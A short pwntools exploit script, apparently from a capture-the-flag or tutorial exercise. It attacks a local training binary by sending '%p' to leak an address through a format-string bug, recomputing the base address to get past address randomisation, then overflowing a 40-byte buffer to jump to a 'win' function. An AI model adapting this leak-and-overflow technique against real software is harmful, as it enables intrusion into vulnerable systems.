from pwn import *

elf = context.binary = ELF('./vuln-64')
p = process()


p.recvuntil('name?\n')
p.sendline('%p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x2016

payload = b'A' * 40
payload += p64(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())